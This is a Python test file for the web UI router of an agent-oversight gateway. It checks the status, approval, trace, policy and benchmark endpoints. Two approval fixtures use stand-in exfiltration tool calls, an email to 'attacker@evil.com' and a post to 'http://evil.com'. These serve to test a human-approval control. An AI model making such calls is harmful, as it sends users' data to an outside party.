"""
test_ui_router.py — Tests for the Web UI FastAPI router.

Verifies:
  - Static files (index.html, style.css, app.js) are served correctly.
  - /ui/api/status returns manifest and gateway metadata.
  - /ui/api/decisions returns all approvals (pending + resolved).
  - /ui/api/traces returns sessions with their event logs.
  - /ui/api/provenance returns policy rules from YAML.
  - /ui/api/benchmarks returns report files from disk.
  - All data endpoints degrade gracefully when the control plane is absent.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest
from fastapi.testclient import TestClient

MANIFESTS_DIR = Path(__file__).parent.parent.parent / "manifests"
_POLICY_PATH = (
    Path(__file__).parent.parent.parent
    / "src" / "agent_hypervisor" / "runtime" / "configs" / "default_policy.yaml"
)


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

def _make_manifest(tool_names: list[str]):
    from agent_hypervisor.compiler.schema import WorldManifest, CapabilityConstraint
    return WorldManifest(
        workflow_id="test-world",
        version="1.0",
        capabilities=[CapabilityConstraint(tool=name) for name in tool_names],
    )


def _make_gw_state(tool_names: list[str] | None = None):
    """Build a minimal MCPGatewayState-like mock for the UI router."""
    tool_names = tool_names or ["read_file", "send_email"]
    manifest = _make_manifest(tool_names)

    renderer = MagicMock()
    renderer.render.return_value = [MagicMock(name=t) for t in tool_names]
    # Make each mock's .name property return the tool name
    for i, mock_tool in enumerate(renderer.render.return_value):
        type(mock_tool).name = property(lambda self, n=tool_names[i]: n)

    resolver = MagicMock()
    resolver.manifest = manifest

    gw = MagicMock()
    gw.resolver = resolver
    gw.renderer = renderer
    gw.manifest_path = Path("manifests/example_world.yaml")
    gw.started_at = "2026-01-01T00:00:00+00:00"
    return gw, manifest


def _make_app(tool_names=None, with_control_plane=False, policy_path=None):
    from fastapi import FastAPI
    from agent_hypervisor.ui.router import create_ui_router

    gw_state, _ = _make_gw_state(tool_names)
    cp_state = None

    if with_control_plane:
        from agent_hypervisor.control_plane.api import ControlPlaneState
        cp_state = ControlPlaneState.create()

    app = FastAPI()
    app.include_router(create_ui_router(gw_state, cp_state, policy_path))
    return app, cp_state


# ---------------------------------------------------------------------------
# Static file serving
# ---------------------------------------------------------------------------

class TestStaticFiles:

    def test_ui_root_returns_html(self):
        app, _ = _make_app()
        client = TestClient(app)
        resp = client.get("/ui/")
        assert resp.status_code == 200
        assert "text/html" in resp.headers["content-type"]
        assert "<title>" in resp.text

    def test_ui_no_trailing_slash_also_works(self):
        app, _ = _make_app()
        client = TestClient(app)
        resp = client.get("/ui")
        assert resp.status_code == 200
        assert "text/html" in resp.headers["content-type"]

    def test_ui_html_references_css_and_js(self):
        app, _ = _make_app()
        client = TestClient(app)
        html = client.get("/ui/").text
        assert "/ui/style.css" in html
        assert "/ui/app.js" in html

    def test_css_served_with_correct_content_type(self):
        app, _ = _make_app()
        client = TestClient(app)
        resp = client.get("/ui/style.css")
        assert resp.status_code == 200
        assert "text/css" in resp.headers["content-type"]
        assert ":root" in resp.text  # sanity check on content

    def test_js_served_with_correct_content_type(self):
        app, _ = _make_app()
        client = TestClient(app)
        resp = client.get("/ui/app.js")
        assert resp.status_code == 200
        assert "javascript" in resp.headers["content-type"]
        assert "switchTab" in resp.text  # sanity check on content


# ---------------------------------------------------------------------------
# /ui/api/status
# ---------------------------------------------------------------------------

class TestApiStatus:

    def test_status_returns_200(self):
        app, _ = _make_app()
        client = TestClient(app)
        resp = client.get("/ui/api/status")
        assert resp.status_code == 200

    def test_status_contains_manifest_fields(self):
        app, _ = _make_app(["read_file", "send_email"])
        client = TestClient(app)
        data = client.get("/ui/api/status").json()
        assert data["status"] == "running"
        assert "manifest" in data
        m = data["manifest"]
        assert m["workflow_id"] == "test-world"
        assert m["version"] == "1.0"
        assert isinstance(m["capabilities"], list)
        assert len(m["capabilities"]) == 2

    def test_status_visible_tools_listed(self):
        app, _ = _make_app(["read_file"])
        client = TestClient(app)
        data = client.get("/ui/api/status").json()
        assert "read_file" in data["manifest"]["visible_tools"]

    def test_status_control_plane_false_when_absent(self):
        app, _ = _make_app(with_control_plane=False)
        client = TestClient(app)
        data = client.get("/ui/api/status").json()
        assert data["control_plane"] is False
        assert data["session_count"] == 0

    def test_status_control_plane_true_when_wired(self):
        app, _ = _make_app(with_control_plane=True)
        client = TestClient(app)
        data = client.get("/ui/api/status").json()
        assert data["control_plane"] is True


# ---------------------------------------------------------------------------
# /ui/api/decisions
# ---------------------------------------------------------------------------

class TestApiDecisions:

    def test_decisions_empty_without_control_plane(self):
        app, _ = _make_app(with_control_plane=False)
        client = TestClient(app)
        data = client.get("/ui/api/decisions").json()
        assert data["approvals"] == []
        assert data["pending_count"] == 0
        assert data["total"] == 0

    def test_decisions_empty_when_no_approvals(self):
        app, _ = _make_app(with_control_plane=True)
        client = TestClient(app)
        data = client.get("/ui/api/decisions").json()
        assert data["total"] == 0
        assert data["pending_count"] == 0

    def test_decisions_includes_pending_approval(self):
        app, cp = _make_app(with_control_plane=True)
        client = TestClient(app)

        # Create an approval via the service directly
        cp.approval_service.request_approval(
            session_id="sess-001",
            tool_name="send_email",
            arguments={"to": "attacker@evil.com", "body": "exfil"},
            requested_by="agent",
        )

        data = client.get("/ui/api/decisions").json()
        assert data["total"] == 1
        assert data["pending_count"] == 1
        approval = data["approvals"][0]
        assert approval["tool_name"] == "send_email"
        assert approval["status"] == "pending"
        assert approval["session_id"] == "sess-001"

    def test_decisions_includes_resolved_approval(self):
        app, cp = _make_app(with_control_plane=True)
        client = TestClient(app)

        a = cp.approval_service.request_approval(
            session_id="sess-002",
            tool_name="write_file",
            arguments={"path": "/tmp/x", "content": "data"},
            requested_by="agent",
        )
        cp.approval_service.resolve(a.approval_id, "allowed", "operator")

        data = client.get("/ui/api/decisions").json()
        assert data["total"] == 1
        assert data["pending_count"] == 0
        assert data["approvals"][0]["status"] == "allowed"

    def test_decisions_contains_required_fields(self):
        app, cp = _make_app(with_control_plane=True)
        client = TestClient(app)

        cp.approval_service.request_approval(
            session_id="sess-003",
            tool_name="http_post",
            arguments={"url": "http://evil.com", "body": "x"},
            requested_by="agent",
        )

        approval = client.get("/ui/api/decisions").json()["approvals"][0]
        for field in ("approval_id", "session_id", "tool_name", "status",
                      "requested_by", "created_at", "action_fingerprint",
                      "arguments_summary", "scoped_verdicts"):
            assert field in approval, f"Missing field: {field}"


# ---------------------------------------------------------------------------
# /ui/api/traces
# ---------------------------------------------------------------------------

class TestApiTraces:

    def test_traces_empty_without_control_plane(self):
        app, _ = _make_app(with_control_plane=False)
        client = TestClient(app)
        data = client.get("/ui/api/traces").json()
        assert data["sessions"] == []
        assert data["total_events"] == 0

    def test_traces_empty_when_no_sessions(self):
        app, _ = _make_app(with_control_plane=True)
        client = TestClient(app)
        data = client.get("/ui/api/traces").json()
        assert data["sessions"] == []

    def test_traces_includes_sessions_and_events(self):
        app, cp = _make_app(with_control_plane=True)
        client = TestClient(app)

        sess = cp.session_store.create(manifest_id="test-world", session_id="trace-sess-1")
        from agent_hypervisor.control_plane.event_store import make_tool_call
        cp.event_store.append(make_tool_call(
            session_id=sess.session_id,
            tool_name="read_file",
            decision="allow",
            rule_hit="allow-read-file",
        ))

        data = client.get("/ui/api/traces").json()
        assert len(data["sessions"]) == 1
        assert data["total_events"] == 1
        s = data["sessions"][0]
        assert s["session_id"] == "trace-sess-1"
        assert len(s["events"]) == 1
        e = s["events"][0]
        assert e["type"] == "tool_call"
        assert e["decision"] == "allow"
        assert e["rule_hit"] == "allow-read-file"

    def test_traces_session_contains_required_fields(self):
        app, cp = _make_app(with_control_plane=True)
        client = TestClient(app)
        cp.session_store.create(manifest_id="test-world", session_id="trace-sess-2")

        sess_data = client.get("/ui/api/traces").json()["sessions"][0]
        for field in ("session_id", "state", "mode", "manifest_id", "created_at", "events"):
            assert field in sess_data, f"Missing field: {field}"


# ---------------------------------------------------------------------------
# /ui/api/provenance
# ---------------------------------------------------------------------------

class TestApiProvenance:

    def test_provenance_empty_when_no_policy_path(self):
        app, _ = _make_app(policy_path=None)
        client = TestClient(app)
        data = client.get("/ui/api/provenance").json()
        assert data["rules"] == []
        assert data["source"] is None
        assert data["count"] == 0

    def test_provenance_empty_when_path_does_not_exist(self):
        app, _ = _make_app(policy_path=Path("/nonexistent/policy.yaml"))
        client = TestClient(app)
        data = client.get("/ui/api/provenance").json()
        assert data["rules"] == []

    def test_provenance_loads_default_policy(self):
        if not _POLICY_PATH.exists():
            pytest.skip("default_policy.yaml not found")
        app, _ = _make_app(policy_path=_POLICY_PATH)
        client = TestClient(app)
        data = client.get("/ui/api/provenance").json()
        assert data["count"] > 0
        assert data["rules"]
        assert data["source"] is not None

    def test_provenance_rule_has_required_fields(self):
        if not _POLICY_PATH.exists():
            pytest.skip("default_policy.yaml not found")
        app, _ = _make_app(policy_path=_POLICY_PATH)
        client = TestClient(app)
        rules = client.get("/ui/api/provenance").json()["rules"]
        for rule in rules:
            assert "id" in rule
            assert "tool" in rule
            assert "verdict" in rule

    def test_provenance_rules_from_custom_policy(self):
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False
        ) as f:
            f.write("rules:\n  - id: allow-test\n    tool: test_tool\n    verdict: allow\n")
            fpath = Path(f.name)
        try:
            app, _ = _make_app(policy_path=fpath)
            client = TestClient(app)
            data = client.get("/ui/api/provenance").json()
            assert data["count"] == 1
            assert data["rules"][0]["id"] == "allow-test"
            assert data["rules"][0]["verdict"] == "allow"
        finally:
            fpath.unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# /ui/api/benchmarks
# ---------------------------------------------------------------------------

class TestApiBenchmarks:

    def test_benchmarks_empty_when_no_reports(self, tmp_path, monkeypatch):
        """Router returns empty list when the benchmark dir has no .md files."""
        import agent_hypervisor.ui.router as ui_router_mod
        monkeypatch.setattr(ui_router_mod, "_BENCHMARK_DIR", tmp_path)

        app, _ = _make_app()
        client = TestClient(app)
        data = client.get("/ui/api/benchmarks").json()
        assert data["reports"] == []
        assert data["count"] == 0

    def test_benchmarks_returns_report_content(self, tmp_path, monkeypatch):
        """Router serves .md files from the benchmark reports directory."""
        import agent_hypervisor.ui.router as ui_router_mod
        monkeypatch.setattr(ui_router_mod, "_BENCHMARK_DIR", tmp_path)

        (tmp_path / "report-test.md").write_text("# Test Report\n\nmetric: 100%\n")

        app, _ = _make_app()
        client = TestClient(app)
        data = client.get("/ui/api/benchmarks").json()
        assert data["count"] == 1
        assert data["reports"][0]["filename"] == "report-test.md"
        assert "Test Report" in data["reports"][0]["content"]

    def test_benchmarks_returns_multiple_reports(self, tmp_path, monkeypatch):
        import agent_hypervisor.ui.router as ui_router_mod
        monkeypatch.setattr(ui_router_mod, "_BENCHMARK_DIR", tmp_path)

        (tmp_path / "report-a.md").write_text("# A")
        (tmp_path / "report-b.md").write_text("# B")

        app, _ = _make_app()
        client = TestClient(app)
        data = client.get("/ui/api/benchmarks").json()
        assert data["count"] == 2
        names = {r["filename"] for r in data["reports"]}
        assert names == {"report-a.md", "report-b.md"}
